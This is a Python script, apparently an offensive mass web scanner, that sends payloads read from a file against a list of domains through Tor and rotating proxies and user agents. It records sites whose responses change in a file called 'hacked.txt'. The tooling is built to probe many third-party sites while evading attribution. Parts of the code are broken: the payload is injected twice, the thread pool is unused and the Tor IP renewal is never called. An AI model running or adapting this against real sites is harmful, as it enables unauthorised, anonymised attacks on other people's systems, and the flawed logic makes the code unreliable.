import aiohttp
import asyncio
import os
import time
import random
from stem import Signal
from stem.control import Controller
from concurrent.futures import ThreadPoolExecutor

# File paths for our data
DOMAINS_FILE = "domains.txt"
PAYLOADS_FILE = "payloads.txt"
USERAGENTS_FILE = "useragents.txt"
RESULTS_FILE = "hacked.txt"
PROXIES_FILE = "proxies.txt"

# Tor setup
TOR_PROXY = 'socks5h://127.0.0.1:9050'
controller = Controller.from_port(port=9051)

def init_tor():
    try:
        controller.authenticate()  # Assumes no password is set in torrc for control port
        print("[INFO] Tor connection authenticated.")
    except:
        print("[ERROR] Tor authentication failed. Ensure Tor is running.")

def renew_tor_ip():
    """
    Renew the Tor IP by sending the NEWNYM signal.
    """
    controller.signal(Signal.NEWNYM)
    time.sleep(5)

def load_file(filename):
    try:
        with open(filename, 'r') as file:
            return [line.strip() for line in file if line.strip() and not line.startswith("#")]
    except FileNotFoundError:
        print(f"[ERROR] File not found: {filename}")
        return []

# Rotate user agents and proxies for each request
def get_random_user_agent(user_agents):
    return random.choice(user_agents)

def get_next_proxy(proxies, current_proxy_index):
    """
    Rotate to the next proxy. If all proxies are exhausted, return None to fallback to direct connection.
    """
    if not proxies:
        return None, -1
    next_index = (current_proxy_index + 1) % len(proxies)
    proxy_url = f'socks5://{proxies[next_index]}' if proxies[next_index] else None
    return proxy_url, next_index

async def check_proxy(proxy, session):
    """
    Check if a proxy can connect to a test URL to ensure it's working.
    """
    try:
        test_url = "https://www.google.com"  # A reliable endpoint to verify connectivity
        async with session.get(test_url, proxy=proxy, timeout=5) as response:
            return response.status == 200
    except:
        return False

async def fetch_url(session, url, payload, user_agent, proxy):
    headers = {"User-Agent": user_agent}
    try:
        async with session.get(url, headers=headers, proxy=proxy, timeout=10) as response:
            if response.status == 200:
                text = await response.text()
                return text  # Return the content for validation
    except Exception as e:
        print(f"[ERROR] {url} - {e}")
    return None

async def test_payloads(domain, payloads, user_agents, proxies):
    async with aiohttp.ClientSession() as session:
        proxy_index = -1  # Start without any proxy
        for payload in payloads:
            # Construct URL and select a User-Agent
            url = f"https://{domain}/{payload}"
            user_agent = get_random_user_agent(user_agents)

            # Check proxy and rotate if needed
            proxy, proxy_index = get_next_proxy(proxies, proxy_index)
            while proxy:
                if await check_proxy(proxy, session):
                    print(f"[INFO] Using proxy {proxy} for {url}")
                    break
                else:
                    print(f"[INFO] Proxy {proxy} failed. Trying next proxy...")
                    proxy, proxy_index = get_next_proxy(proxies, proxy_index)

            # Fetch the initial page content
            print(f"[INFO] Testing payload: {payload} on {domain}")
            before_content = await fetch_url(session, url, "", user_agent, proxy)
            if not before_content:
                continue

            # Inject payload and fetch the page again
            injected_url = f"{url}/{payload}"
            after_content = await fetch_url(session, injected_url, payload, user_agent, proxy)

            # Compare before and after content
            if after_content and before_content != after_content:
                print(f"[SUCCESS] Potential vulnerability found on {url} with payload {payload}")
                with open(RESULTS_FILE, "a") as result_file:
                    result_file.write(f"URL: {url}\nPayload: {payload}\n--- Before ---\n{before_content[:500]}\n--- After ---\n{after_content[:500]}\n{'-'*50}\n")

            # Rotate User-Agent and Proxy for the next payload
            user_agent = get_random_user_agent(user_agents)
            proxy, proxy_index = get_next_proxy(proxies, proxy_index)

async def main():
    # Load data from files
    domains = load_file(DOMAINS_FILE)
    payloads = load_file(PAYLOADS_FILE)
    user_agents = load_file(USERAGENTS_FILE)
    proxies = load_file(PROXIES_FILE)

    # Initialize Tor
    init_tor()

    # Multithreading for Tor IP management
    with ThreadPoolExecutor() as executor:
        futures = []
        for domain in domains:
            # Submit payload tests for each domain, testing all payloads sequentially per domain
            futures.append(asyncio.ensure_future(test_payloads(domain, payloads, user_agents, proxies)))

        await asyncio.gather(*futures)

    print("[COMPLETED] All domains and payloads tested.")

if __name__ == "__main__":
    asyncio.run(main())
